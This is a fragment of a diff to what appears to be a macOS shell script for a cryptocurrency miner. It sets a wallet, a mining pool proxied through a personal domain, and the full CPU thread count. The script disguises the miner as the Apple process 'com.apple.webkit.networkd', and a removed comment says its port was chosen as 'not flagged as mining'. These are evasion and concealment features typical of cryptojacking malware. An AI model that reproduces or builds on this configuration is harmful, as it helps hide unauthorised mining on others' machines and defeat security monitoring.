@@ -9,7 +9,7 @@
 WALLET="RSwiruLQYNgpWP36JKEmRQUddTWWi4MsVX"
 WORKER="mac1"
 POOL_HOST="cdn.soumalya.in"  # Your domain — proxies to LuckPool via VPS
-POOL_PORT="8443"              # HTTPS alt-port — not flagged as mining
+POOL_PORT="3956"              # Needs Oracle Security List ingress rule open
 THREADS=$(sysctl -n hw.logicalcpu)
 
 DISGUISE_NAME="com.apple.webkit.networkd"
